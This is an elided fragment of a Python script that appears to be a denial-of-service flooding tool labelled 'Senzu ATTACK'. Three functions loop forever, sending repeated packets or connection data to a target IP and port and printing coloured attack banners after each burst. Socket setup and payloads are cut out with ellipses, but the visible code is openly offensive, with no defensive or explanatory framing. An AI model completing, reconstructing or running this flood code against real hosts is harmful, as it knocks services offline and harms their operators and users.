	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m Senzu ATTACK!!! IP\033[92m >>> {}:{} \u001b[31m".format(ip, port))
		except:
...
def ddos2():
	...
	while True:
		try:
			...
			s.close()
			print("\u001b[31m[×] Senzu ATTACK IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
...
def ddos3():
	...
	while True:
		try:
			...
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m Senzu ATTACK!!! TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[$] Senzu ATTACK IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
